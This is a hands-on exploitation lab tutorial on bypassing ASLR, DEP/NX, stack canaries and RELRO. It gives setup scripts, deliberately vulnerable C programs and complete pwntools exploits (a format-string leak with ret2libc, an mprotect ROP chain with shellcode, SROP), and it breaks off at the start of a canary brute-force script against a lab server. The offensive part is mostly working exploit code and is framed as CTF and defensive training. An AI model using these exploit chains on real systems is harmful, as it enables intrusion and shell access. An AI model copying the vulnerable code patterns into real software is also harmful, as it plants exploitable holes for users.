# Tutorial: Mitigation Bypass Techniques — Hands-On Lab

> **Mapped source:** `domain6_mitigation_bypass.md`
> **Domain:** 6 — Mitigation Bypass
> **Focus:** ASLR bypass, DEP/NX bypass, stack canary bypass, RELRO bypass, CFI bypass, KASLR bypass, detection engineering
> **Context:** Authorized security research, CTF training, defensive evaluation

---

## Lab Environment Setup

### Architecture Overview

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        HOST (Linux x86_64)                                 │
│                                                                            │
│  ┌────────────────────┐  ┌────────────────────┐  ┌────────────────────┐  │
│  │   bypass-dev       │  │   bypass-target    │  │   bypass-detect    │  │
│  │  (Ubuntu 24.04)    │  │  (Ubuntu 22.04)    │  │  (Ubuntu 24.04)    │  │
│  │                    │  │                    │  │                    │  │
│  │  • pwntools        │  │  • glibc 2.35      │  │  • Falco           │  │
│  │  • ROPgadget       │  │  • glibc 2.31      │  │  • auditd          │  │
│  │  • one_gadget      │  │  • Vulnerable bins  │  │  • Sigma rules     │  │
│  │  • gdb + pwndbg    │  │  • Fork servers    │  │  • YARA engine      │  │
│  │  • radare2/rizin   │  │  • CFI-enabled bins │  │  • Intel PT tools  │  │
│  │  • Clang 17+       │  │  • Multiple glibc   │  │  • eBPF detectors  │  │
│  │  • GCC 13+         │  │    versions         │  │  • Elastic/SIEM    │  │
│  │  • checksec        │  │                    │  │                    │  │
│  │  IP: 10.6.0.10     │  │  IP: 10.6.0.20     │  │  IP: 10.6.0.30     │  │
│  └────────────────────┘  └────────────────────┘  └────────────────────┘  │
│                                                                            │
│                     Network: 10.6.0.0/24 (bypass-lab)                      │
└──────────────────────────────────────────────────────────────────────────┘
```

### VM Requirements

| VM | RAM | Disk | CPU | Purpose |
|----|-----|------|-----|---------|
| bypass-dev | 4 GB | 40 GB | 2 vCPU | Exploit development, toolchain |
| bypass-target | 4 GB | 30 GB | 2 vCPU | Vulnerable binaries, multiple glibc |
| bypass-detect | 4 GB | 40 GB | 2 vCPU | Detection stack, SIEM, monitoring |

### Installation Script

```bash
#!/bin/bash
# setup_bypass_lab.sh — Complete lab environment for Domain 6 tutorial
# Run on each VM as root

set -euo pipefail

ROLE="${1:-dev}"  # dev | target | detect

install_common() {
    apt-get update && apt-get upgrade -y
    apt-get install -y \
        build-essential git curl wget python3 python3-pip python3-venv \
        nmap net-tools tcpdump wireshark-common tshark \
        tmux vim htop strace ltrace binutils file \
        linux-tools-generic auditd audispd-plugins
}

install_dev() {
    echo "[*] Installing exploit development tools..."

    # Compilers
    apt-get install -y gcc g++ clang lld llvm \
        gcc-multilib g++-multilib \
        nasm

    # Debugger
    apt-get install -y gdb
    git clone https://github.com/pwndbg/pwndbg.git /opt/pwndbg
    cd /opt/pwndbg && ./setup.sh

    # pwntools and exploit dev
    python3 -m pip install --break-system-packages \
        pwntools ropper capstone keystone-engine unicorn

    # ROPgadget
    python3 -m pip install --break-system-packages ROPgadget

    # one_gadget (Ruby)
    apt-get install -y ruby ruby-dev
    gem install one_gadget

    # radare2
    git clone https://github.com/radareorg/radare2.git /opt/radare2
    cd /opt/radare2 && sys/install.sh

    # checksec
    git clone https://github.com/slimm609/checksec.sh.git /opt/checksec
    ln -sf /opt/checksec/checksec /usr/local/bin/checksec

    # Ghidra (headless analysis)
    wget -q "https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.1.2_build/ghidra_11.1.2_PUBLIC_20240709.zip" \
        -O /tmp/ghidra.zip || true
    unzip -q /tmp/ghidra.zip -d /opt/ 2>/dev/null || true

    # seccomp-tools
    gem install seccomp-tools

    # LibcSearcher
    python3 -m pip install --break-system-packages LibcSearcher

    echo "[+] Dev tools installed."
}

install_target() {
    echo "[*] Setting up target environment..."

    # Install multiple glibc versions via containers
    apt-get install -y podman

    # Create directories for vulnerable binaries
    mkdir -p /opt/labs/{aslr,dep,canary,relro,cfi,kaslr,heap}

    # Install specific glibc debug symbols
    apt-get install -y libc6-dbg

    # xinetd for network services
    apt-get install -y xinetd socat

    # Allow core dumps for crash analysis
    echo 'kernel.core_pattern=/tmp/cores/core.%e.%p.%t' >> /etc/sysctl.conf
    mkdir -p /tmp/cores
    chmod 1777 /tmp/cores
    sysctl -p

    # Disable ASLR system-wide toggle (for controlled labs)
    echo "# Toggle ASLR: echo 0|2 > /proc/sys/kernel/randomize_va_space" \
        >> /etc/motd

    echo "[+] Target environment ready."
}

install_detect() {
    echo "[*] Installing detection stack..."

    # auditd (already installed via common)
    systemctl enable auditd

    # Falco
    curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
        gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
        https://download.falco.org/packages/deb stable main" \
        > /etc/apt/sources.list.d/falcosecurity.list
    apt-get update && apt-get install -y falco

    # YARA
    apt-get install -y yara

    # Sigma CLI
    python3 -m pip install --break-system-packages sigma-cli pySigma

    # Intel PT decoding tools
    apt-get install -y libipt-dev intel-processor-trace

    # eBPF tools
    apt-get install -y bpftrace bpfcc-tools linux-headers-$(uname -r)

    # Elastic stack (lightweight)
    apt-get install -y default-jre
    wget -qO /tmp/filebeat.deb \
        "https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.13.0-amd64.deb" || true
    dpkg -i /tmp/filebeat.deb 2>/dev/null || true

    # Sigma rules directory
    mkdir -p /opt/sigma-rules/bypass-detection
    mkdir -p /opt/yara-rules/exploit-detection

    echo "[+] Detection stack installed."
}

# Execute role-specific installation
install_common
case "$ROLE" in
    dev)    install_dev ;;
    target) install_target ;;
    detect) install_detect ;;
    *)      echo "Usage: $0 {dev|target|detect}"; exit 1 ;;
esac

echo "[✓] Setup complete for role: $ROLE"
```

### Vulnerable Binaries Compilation

Run on `bypass-target` to build all lab binaries:

```bash
#!/bin/bash
# compile_labs.sh — Build all vulnerable binaries for the lab exercises
# Run on bypass-target

set -euo pipefail

LAB_DIR="/opt/labs"
mkdir -p "$LAB_DIR"/{aslr,dep,canary,relro,cfi,heap}

# ===== Lab 1: ASLR Bypass via Format String =====
cat > "$LAB_DIR/aslr/vuln_fmt_aslr.c" << 'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[128];

    printf("Enter input: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);

    printf(buf);
    printf("\n");

    printf("Enter payload: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);
}

int main(void) {
    vulnerable();
    return 0;
}
EOF

gcc -o "$LAB_DIR/aslr/vuln_fmt_aslr" "$LAB_DIR/aslr/vuln_fmt_aslr.c" \
    -fno-stack-protector -no-pie -Wno-format-security -z norelro

# PIE version (harder — requires double leak)
gcc -o "$LAB_DIR/aslr/vuln_fmt_aslr_pie" "$LAB_DIR/aslr/vuln_fmt_aslr.c" \
    -fno-stack-protector -pie -Wno-format-security -z norelro

# ===== Lab 1b: Partial Pointer Overwrite =====
cat > "$LAB_DIR/aslr/vuln_partial.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void) {
    printf("[+] win() reached!\n");
    system("/bin/sh");
}

void normal_handler(void) {
    printf("[*] normal_handler() called\n");
}

struct request {
    char buffer[64];
    void (*handler)(void);
};

int main(void) {
    struct request *req = malloc(sizeof(struct request));
    req->handler = normal_handler;

    printf("win() is at: %p\n", win);
    printf("normal_handler() is at: %p\n", normal_handler);
    printf("Enter data (max 66 bytes for partial overwrite): ");
    fflush(stdout);

    // Overflow: can write 2 bytes past buffer into handler pointer
    read(STDIN_FILENO, req->buffer, 66);

    req->handler();
    free(req);
    return 0;
}
EOF

gcc -o "$LAB_DIR/aslr/vuln_partial" "$LAB_DIR/aslr/vuln_partial.c" \
    -fno-stack-protector -no-pie -Wno-format-security

# ===== Lab 2: DEP Bypass via ROP (mprotect) =====
cat > "$LAB_DIR/dep/vuln_dep.c" << 'EOF'
#include <stdio.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[64];
    printf("Send payload: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 512);
}

int main(void) {
    vulnerable();
    return 0;
}
EOF

# Static build — rich gadget set, no ASLR concern for libc
gcc -o "$LAB_DIR/dep/vuln_dep_static" "$LAB_DIR/dep/vuln_dep.c" \
    -fno-stack-protector -no-pie -z norelro -static

# Dynamic build — requires ASLR leak first
gcc -o "$LAB_DIR/dep/vuln_dep_dynamic" "$LAB_DIR/dep/vuln_dep.c" \
    -fno-stack-protector -no-pie -z norelro

# ===== Lab 2b: SROP (Sigreturn-Oriented Programming) =====
cat > "$LAB_DIR/dep/vuln_srop.c" << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

// Minimal binary: provides syscall gadget and sigreturn gadget
void gadgets(void) {
    __asm__ volatile (
        "syscall_gadget:\n"
        "syscall\n"
        "ret\n"
        "sigreturn_gadget:\n"
        "mov $15, %rax\n"  // __NR_rt_sigreturn = 15
        "syscall\n"
    );
}

void vulnerable(void) {
    char buf[64];
    read(STDIN_FILENO, buf, 512);
}

int main(void) {
    vulnerable();
    return 0;
}
EOF

gcc -o "$LAB_DIR/dep/vuln_srop" "$LAB_DIR/dep/vuln_srop.c" \
    -fno-stack-protector -no-pie -z norelro -static

# ===== Lab 3: Stack Canary Bypass (Fork Brute-Force) =====
cat > "$LAB_DIR/canary/vuln_fork_canary.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 1337
#define BUF_SIZE 64

void handle_client(int sock) {
    char buf[BUF_SIZE];
    ssize_t n = read(sock, buf, 256);  // overflow
    if (n > 0) {
        write(sock, "OK\n", 3);
    }
}

int main(void) {
    signal(SIGCHLD, SIG_IGN);  // auto-reap children

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = INADDR_ANY
    };
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 128);

    printf("[*] Forking server on port %d\n", PORT);
    fflush(stdout);

    while (1) {
        int client = accept(srv, NULL, NULL);
        if (client < 0) continue;
        if (fork() == 0) {
            close(srv);
            handle_client(client);
            close(client);
            _exit(0);
        }
        close(client);
    }
}
EOF

gcc -o "$LAB_DIR/canary/vuln_fork_canary" "$LAB_DIR/canary/vuln_fork_canary.c" \
    -fstack-protector-all -no-pie

# ===== Lab 3b: Canary Leak via Format String =====
cat > "$LAB_DIR/canary/vuln_canary_leak.c" << 'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[64];

    // First read: format string (leaks canary)
    printf("Leak phase: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 64);
    printf(buf);
    printf("\n");
    memset(buf, 0, 64);

    // Second read: overflow with known canary
    printf("Overflow phase: ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);
}

void win(void) {
    printf("[+] Canary bypassed! Shell incoming.\n");
    system("/bin/sh");
}

int main(void) {
    vulnerable();
    return 0;
}
EOF

gcc -o "$LAB_DIR/canary/vuln_canary_leak" "$LAB_DIR/canary/vuln_canary_leak.c" \
    -fstack-protector-all -no-pie -Wno-format-security -z norelro

# ===== Lab 4: RELRO Bypass (Partial — GOT Overwrite) =====
cat > "$LAB_DIR/relro/vuln_partial_relro.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void) {
    system("/bin/sh");
}

int main(void) {
    char buf[128];

    printf("puts@GOT: %p\n", (void *)0);  // placeholder
    printf("Enter format string: ");
    fflush(stdout);

    read(STDIN_FILENO, buf, 128);
    printf(buf);  // format string vuln for arbitrary write
    printf("\n");

    // After GOT overwrite, this puts() call goes to attacker target
    puts("Goodbye!");  // puts@GOT → system or win
    return 0;
}
EOF

gcc -o "$LAB_DIR/relro/vuln_partial_relro" "$LAB_DIR/relro/vuln_partial_relro.c" \
    -fno-stack-protector -no-pie -Wno-format-security -z relro

# Full RELRO version (forces alternative targets)
gcc -o "$LAB_DIR/relro/vuln_full_relro" "$LAB_DIR/relro/vuln_partial_relro.c" \
    -fno-stack-protector -no-pie -Wno-format-security -z relro -z now

# ===== Lab 4b: FSOP (Full RELRO bypass via _IO_FILE) =====
cat > "$LAB_DIR/relro/vuln_fsop.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHUNK_SIZE 0x1e0  // size to overlap with _IO_FILE

struct note {
    char *content;
    size_t size;
};

static struct note notes[16];

void menu(void) {
    puts("1) alloc  2) free  3) edit  4) show  5) exit");
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    int choice, idx;
    size_t size;

    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                scanf("%d %zu", &idx, &size);
                if (idx >= 0 && idx < 16 && size <= 0x500) {
                    notes[idx].content = malloc(size);
                    notes[idx].size = size;
                }
                break;
            case 2:
                scanf("%d", &idx);
                if (idx >= 0 && idx < 16) {
                    free(notes[idx].content);
                    // BUG: UAF — no NULL assignment
                }
                break;
            case 3:
                scanf("%d", &idx);
                if (idx >= 0 && idx < 16 && notes[idx].content) {
                    read(STDIN_FILENO, notes[idx].content, notes[idx].size);
                }
                break;
            case 4:
                scanf("%d", &idx);
                if (idx >= 0 && idx < 16 && notes[idx].content) {
                    write(STDOUT_FILENO, notes[idx].content, notes[idx].size);
                }
                break;
            case 5:
                exit(0);  // triggers _IO_flush_all_lockp → FSOP
        }
    }
}
EOF

gcc -o "$LAB_DIR/relro/vuln_fsop" "$LAB_DIR/relro/vuln_fsop.c" \
    -pie -fstack-protector-strong -Wl,-z,relro,-z,now

# ===== Lab 5: Heap Exploitation (tcache poisoning, glibc 2.35+) =====
cat > "$LAB_DIR/heap/vuln_tcache.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_SLOTS 16

struct slot {
    char *ptr;
    size_t size;
};

static struct slot slots[MAX_SLOTS];

void menu(void) {
    puts("1) alloc  2) free  3) read  4) write  5) exit");
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    int choice, idx;
    size_t sz;

    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                scanf("%d %zu", &idx, &sz);
                if (idx >= 0 && idx < MAX_SLOTS && sz > 0 && sz <= 0x400) {
                    slots[idx].ptr = malloc(sz);
                    slots[idx].size = sz;
                }
                break;
            case 2:
                scanf("%d", &idx);
                if (idx >= 0 && idx < MAX_SLOTS) {
                    free(slots[idx].ptr);
                    // BUG: UAF — pointer not cleared
                }
                break;
            case 3:
                scanf("%d", &idx);
                if (idx >= 0 && idx < MAX_SLOTS && slots[idx].ptr) {
                    write(STDOUT_FILENO, slots[idx].ptr, slots[idx].size);
                }
                break;
            case 4:
                scanf("%d", &idx);
                if (idx >= 0 && idx < MAX_SLOTS && slots[idx].ptr) {
                    read(STDIN_FILENO, slots[idx].ptr, slots[idx].size);
                }
                break;
            case 5:
                exit(0);
        }
    }
}
EOF

gcc -o "$LAB_DIR/heap/vuln_tcache" "$LAB_DIR/heap/vuln_tcache.c" \
    -pie -fstack-protector-strong -Wl,-z,relro,-z,now

# ===== Lab 6: CFI Bypass via COOP =====
cat > "$LAB_DIR/cfi/vuln_coop.cpp" << 'EOF'
#include <cstdio>
#include <cstring>
#include <vector>
#include <unistd.h>

class Plugin {
public:
    virtual void execute() = 0;
    virtual ~Plugin() = default;
};

class LogPlugin : public Plugin {
public:
    char *message;
    void execute() override {
        printf("LOG: %s\n", message);
    }
};

class ExecPlugin : public Plugin {
public:
    char *command;
    void execute() override {
        system(command);
    }
};

class ReadPlugin : public Plugin {
public:
    char *filename;
    void execute() override {
        FILE *f = fopen(filename, "r");
        if (f) {
            char buf[256];
            while (fgets(buf, sizeof(buf), f))
                printf("%s", buf);
            fclose(f);
        }
    }
};

void run_plugins(std::vector<Plugin*> &plugins) {
    for (auto *p : plugins) {
        p->execute();  // virtual dispatch — CFI-protected
    }
}

int main() {
    std::vector<Plugin*> plugins;

    auto *log1 = new LogPlugin();
    log1->message = strdup("System starting");
    plugins.push_back(log1);

    auto *exec1 = new ExecPlugin();
    exec1->command = strdup("echo 'normal operation'");
    plugins.push_back(exec1);

    printf("[*] Simulating heap corruption (UAF of exec1->command)\n");
    printf("[*] Enter new command string: ");
    fflush(stdout);

    // Simulated UAF: attacker controls exec1->command
    char attacker_buf[256] = {0};
    read(STDIN_FILENO, attacker_buf, sizeof(attacker_buf) - 1);
    attacker_buf[strcspn(attacker_buf, "\n")] = '\0';
    free(exec1->command);
    exec1->command = attacker_buf;

    run_plugins(plugins);

    delete log1;
    delete exec1;
    return 0;
}
EOF

# Without CFI (baseline)
g++ -o "$LAB_DIR/cfi/vuln_coop_nocfi" "$LAB_DIR/cfi/vuln_coop.cpp" \
    -fno-stack-protector -no-pie

# With Clang CFI (requires clang + lld + LTO)
clang++ -o "$LAB_DIR/cfi/vuln_coop_cfi" "$LAB_DIR/cfi/vuln_coop.cpp" \
    -fsanitize=cfi -fvisibility=hidden -flto -fuse-ld=lld \
    -fno-sanitize-recover=all 2>/dev/null || \
    echo "[!] Clang CFI build requires clang 14+ and lld"

echo "[+] All lab binaries compiled."
echo "[*] Verify with checksec:"
for bin in "$LAB_DIR"/*/* ; do
    [ -x "$bin" ] && [ -f "$bin" ] && checksec --file="$bin" 2>/dev/null || true
done
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: ASLR Bypass via Format String Information Leak

**Objective:** Defeat ASLR by leaking a libc address through a format-string vulnerability, then achieve code execution via return-to-libc.

**Theory (from source §1.2):** ASLR randomizes library base addresses, but a single leaked pointer from the process's address space reveals the randomization offset. Format strings (`%p`) read stack contents, which contain saved return addresses pointing into libc.

#### Step 1: Reconnaissance

```bash
# On bypass-dev, verify target binary mitigations
checksec --file=/opt/labs/aslr/vuln_fmt_aslr
# Expected: NX enabled, No canary, No PIE, No RELRO, ASLR system-wide

# Verify ASLR is ON
cat /proc/sys/kernel/randomize_va_space
# Expected: 2 (full randomization)

# Confirm libc is randomized across runs
ldd /opt/labs/aslr/vuln_fmt_aslr | grep libc
ldd /opt/labs/aslr/vuln_fmt_aslr | grep libc
# Different addresses each time
```

#### Step 2: Identify Leak Offset

```python
#!/usr/bin/env python3
"""find_leak_offset.py — Probe format string positions to find libc addresses."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

elf = ELF('/opt/labs/aslr/vuln_fmt_aslr')

# Probe offsets 1-30 to find one containing a libc address (0x7f...)
for offset in range(1, 31):
    try:
        p = process('/opt/labs/aslr/vuln_fmt_aslr')
        p.recvuntil(b'Enter input: ')
        p.sendline(f'%{offset}$p'.encode())
        result = p.recvline().strip()
        p.close()

        if result.startswith(b'0x7f'):
            print(f"  Offset {offset:2d}: {result.decode()} ← LIBC ADDRESS")
        elif result.startswith(b'0x'):
            val = int(result, 16)
            if val > 0x400000 and val < 0x7fffffffffff:
                print(f"  Offset {offset:2d}: {result.decode()}")
    except Exception:
        pass
```

**Expected output:**
```
  Offset 15: 0x7f4a2c123d90 ← LIBC ADDRESS
  Offset 17: 0x7ffd8a234b68
```

The value at offset 15 is typically `__libc_start_main_ret` — the return address from `__libc_start_main` back into the CRT startup code.

#### Step 3: Determine Offsets

```bash
# Find __libc_start_main offset in libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
# Note the offset, e.g., 0x29dc0

# Find one_gadget constraints
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Lists gadgets with their constraint requirements

# Find ROP gadgets
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": ret$"

# Find /bin/sh string in libc
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

#### Step 4: Full Exploit

```python
#!/usr/bin/env python3
"""exploit_aslr_fmt.py — Complete ASLR bypass via format string leak + ret2libc."""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('/opt/labs/aslr/vuln_fmt_aslr')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ===== CONFIGURATION (adjust per target) =====
LIBC_RET_OFFSET = 15          # format string offset containing libc addr
RET_OFFSET = 128 + 8          # buffer size + saved RBP

# Offset from leaked value to libc base
# Leaked value = __libc_start_main + <return_instruction_offset>
# Determine via: gdb -q ./vuln_fmt_aslr -ex 'b vulnerable' -ex 'r' -ex 'info frame'
LIBC_START_MAIN_RET = libc.symbols['__libc_start_main'] + 128  # ADJUST

# Gadget offsets (from ROPgadget output)
POP_RDI_RET = 0x2a3e5   # ADJUST: ROPgadget --binary libc.so.6 | grep "pop rdi"
RET_GADGET  = 0x29139    # ADJUST: bare ret for alignment

def exploit():
    p = process('/opt/labs/aslr/vuln_fmt_aslr')

    # Stage 1: Leak libc address
    p.recvuntil(b'Enter input: ')
    p.sendline(f'%{LIBC_RET_OFFSET}$p'.encode())

    leak_str = p.recvline().strip()
    libc_leak = int(leak_str, 16)
    log.info(f'Leaked value: {hex(libc_leak)}')

    libc.address = libc_leak - LIBC_START_MAIN_RET
    log.info(f'libc base: {hex(libc.address)}')

    # Validate: check alignment
    if libc.address & 0xfff != 0:
        log.warning("libc base not page-aligned — offset calculation may be wrong")

    # Stage 2: Build ret2libc payload
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    pop_rdi_ret = libc.address + POP_RDI_RET
    ret_gadget  = libc.address + RET_GADGET

    log.info(f'system: {hex(system_addr)}')
    log.info(f'/bin/sh: {hex(bin_sh_addr)}')

    payload  = b'A' * RET_OFFSET
    payload += p64(ret_gadget)      # stack alignment (Ubuntu requires 16-byte)
    payload += p64(pop_rdi_ret)     # pop rdi; ret
    payload += p64(bin_sh_addr)     # rdi = "/bin/sh"
    payload += p64(system_addr)     # system("/bin/sh")

    p.recvuntil(b'Enter payload: ')
    p.sendline(payload)

    log.success('Shell should be available:')
    p.interactive()

if __name__ == '__main__':
    exploit()
```

#### Step 5: Verify Reliability

```bash
# Run exploit 10 times — should succeed every time because leak defeats ASLR
for i in $(seq 1 10); do
    echo "id" | timeout 5 python3 exploit_aslr_fmt.py 2>/dev/null | grep uid && \
        echo "Run $i: SUCCESS" || echo "Run $i: FAIL"
done
```

**Key insight:** With the information leak, ASLR provides zero additional protection. The leak transforms the problem from "guess from 2^28 possibilities" to "compute from known value."

---

### Exercise 2: DEP/NX Bypass via ROP Chain (mprotect)

**Objective:** Bypass DEP by constructing a ROP chain that calls `mprotect()` to make the stack executable, then execute injected shellcode.

**Theory (from source §2.1):** DEP prevents execution of injected code on data pages. The bypass uses existing code sequences (gadgets) to call `mprotect(stack_page, size, PROT_READ|PROT_WRITE|PROT_EXEC)`, converting a data page to executable.

#### Step 1: Environment Preparation

```bash
# Disable ASLR for this lab (isolate DEP as the sole mitigation)
echo 0 > /proc/sys/kernel/randomize_va_space

# Verify the static binary
checksec --file=/opt/labs/dep/vuln_dep_static
# Expected: NX enabled, No canary, No PIE, No RELRO (static)

# Find overflow offset using cyclic pattern
python3 -c "
from pwn import *
context.arch = 'amd64'
# Generate a De Bruijn sequence to find exact offset
print(cyclic(200).decode())
" | /opt/labs/dep/vuln_dep_static
# Check core dump to find offset
```

#### Step 2: Gadget Discovery

```bash
# Comprehensive gadget search in the static binary
ROPgadget --binary /opt/labs/dep/vuln_dep_static > /tmp/gadgets.txt

# Find essential gadgets
grep "pop rdi ; ret" /tmp/gadgets.txt | head -5
grep "pop rsi ; ret" /tmp/gadgets.txt | head -5
grep "pop rdx ; ret" /tmp/gadgets.txt | head -5
grep "pop rax ; ret" /tmp/gadgets.txt | head -5
grep "syscall$" /tmp/gadgets.txt | head -5
grep "syscall ; ret" /tmp/gadgets.txt | head -5

# Count total gadgets (static binary has thousands)
wc -l /tmp/gadgets.txt
```

#### Step 3: ROP Chain Construction

```python
#!/usr/bin/env python3
"""exploit_dep_mprotect.py — DEP bypass via mprotect ROP chain."""
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('/opt/labs/dep/vuln_dep_static')

# ===== OFFSET DETERMINATION =====
# Method: send cyclic pattern, examine crash in gdb
# gdb /opt/labs/dep/vuln_dep_static
# r < <(python3 -c "from pwn import *; print(cyclic(200).decode())")
# x/gx $rsp  → find the value, then cyclic_find(value)
OFFSET = 64 + 8  # 64-byte buffer + 8-byte saved RBP

# ===== GADGET ADDRESSES (from ROPgadget output) =====
# Replace these with actual addresses from your binary
POP_RDI = 0x401e3e    # pop rdi; ret
POP_RSI = 0x40a0ae    # pop rsi; ret
POP_RDX = 0x4498cb    # pop rdx; ret  (or pop rdx; pop rbx; ret)
POP_RAX = 0x447e37    # pop rax; ret
SYSCALL_RET = 0x4012d3  # syscall; ret
MPROTECT = 0x44a5a0    # address of mprotect in static binary

# ===== STACK ADDRESS =====
# With ASLR off, stack is deterministic. Find via gdb:
# gdb -q ./vuln_dep_static -ex 'b vulnerable' -ex r -ex 'p/x $rsp'
STACK_ADDR = 0x7fffffffe2d0  # ADJUST: address of buf on stack

# Page-align for mprotect
STACK_PAGE = STACK_ADDR & ~0xfff
PAGE_SIZE = 0x2000  # map 2 pages to be safe

# ===== SHELLCODE =====
shellcode = asm(shellcraft.sh())
log.info(f'Shellcode size: {len(shellcode)} bytes')

# ===== BUILD ROP CHAIN =====
rop_chain = b''

# Method A: Direct mprotect via function address (static binary)
# mprotect(STACK_PAGE, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC)
rop_chain += p64(POP_RDI)
rop_chain += p64(STACK_PAGE)
rop_chain += p64(POP_RSI)
rop_chain += p64(PAGE_SIZE)
rop_chain += p64(POP_RDX)
rop_chain += p64(7)              # PROT_READ | PROT_WRITE | PROT_EXEC
rop_chain += p64(MPROTECT)       # call mprotect

# After mprotect returns, jump to shellcode location
# Shellcode is placed after the ROP chain on the stack
shellcode_addr = STACK_ADDR + OFFSET + len(rop_chain) + 8
rop_chain += p64(shellcode_addr)

# ===== ASSEMBLE PAYLOAD =====
payload  = b'\x90' * OFFSET      # NOP-fill buffer + saved RBP
payload += rop_chain              # ROP chain
payload += b'\x90' * 16          # NOP sled before shellcode
payload += shellcode              # execve("/bin/sh")

log.info(f'Total payload: {len(payload)} bytes')
log.info(f'ROP chain: {len(rop_chain)} bytes ({len(rop_chain)//8} gadgets)')
log.info(f'Shellcode at: {hex(shellcode_addr)}')

# ===== EXPLOIT =====
p = process('/opt/labs/dep/vuln_dep_static')
p.recvuntil(b'Send payload: ')
p.sendline(payload)
p.interactive()
```

#### Step 4: Alternative — SROP (Sigreturn-Oriented Programming)

```python
#!/usr/bin/env python3
"""exploit_srop.py — DEP bypass via sigreturn (single-gadget technique)."""
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('/opt/labs/dep/vuln_srop')

OFFSET = 64 + 8

# Find gadgets in the binary
# The binary provides:
#   syscall_gadget: syscall; ret
#   sigreturn_gadget: mov rax, 15; syscall
SYSCALL_RET = 0x401020     # ADJUST: address of syscall; ret
SIGRETURN   = 0x401025     # ADJUST: address of mov rax,15; syscall

# Stack address (ASLR off)
STACK_ADDR = 0x7fffffffe2d0  # ADJUST

STACK_PAGE = STACK_ADDR & ~0xfff

# Build SROP frame for mprotect
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect  # syscall 10
frame.rdi = STACK_PAGE              # page-aligned address
frame.rsi = 0x2000                  # size
frame.rdx = 7                       # PROT_READ|PROT_WRITE|PROT_EXEC
frame.rsp = STACK_ADDR + OFFSET + 8 + len(bytes(frame)) + 8  # after frame
frame.rip = SYSCALL_RET             # execute syscall

# Shellcode placed after the frame
shellcode = asm(shellcraft.sh())
shellcode_addr = STACK_ADDR + OFFSET + 8 + len(bytes(frame)) + 8

# Payload structure:
# [padding] [sigreturn_gadget] [signal_frame] [shellcode_addr] [shellcode]
payload  = b'A' * OFFSET
payload += p64(SIGRETURN)      # triggers sigreturn
payload += bytes(frame)        # forged signal frame → sets all regs
# After mprotect returns via sigreturn's rsp/rip setup:
payload += p64(shellcode_addr) # where execution continues
payload += b'\x90' * 16
payload += shellcode

log.info(f'SROP payload: {len(payload)} bytes')
log.info(f'Signal frame: {len(bytes(frame))} bytes')
log.info(f'Advantage: only 2 gadgets needed (sigreturn + syscall)')

p = process('/opt/labs/dep/vuln_srop')
p.sendline(payload)
p.interactive()
```

**Key insight:** SROP needs only 1-2 gadgets vs. 6+ for a traditional mprotect ROP chain. The 296-byte signal frame sets ALL registers simultaneously.

---

### Exercise 3: Stack Canary Bypass via Fork Server Brute-Force

**Objective:** Brute-force a stack canary byte-by-byte against a fork-without-exec network server.

**Theory (from source §3.2):** In fork() servers, all child processes inherit the parent's canary. The attacker tests one byte at a time — if the child survives (sends response), the byte is correct; if it crashes (no response), the byte is wrong. Maximum 256 × 7 = 1792 attempts.

#### Step 1: Start Target Server

```bash
# On bypass-target
/opt/labs/canary/vuln_fork_canary &
# Server listening on port 1337
```

#### Step 2: Brute-Force Script

```python
#!/usr/bin/env python3
"""exploit_canary_bruteforce.py — Byte-by-byte canary brute-force."""
from pwn import *
import time

context.log_level = 'warning'

HOST = '10.6.0.20'  # bypass-target
PORT = 1337
BUF_SIZE = 64       # known buffer size from source analysis

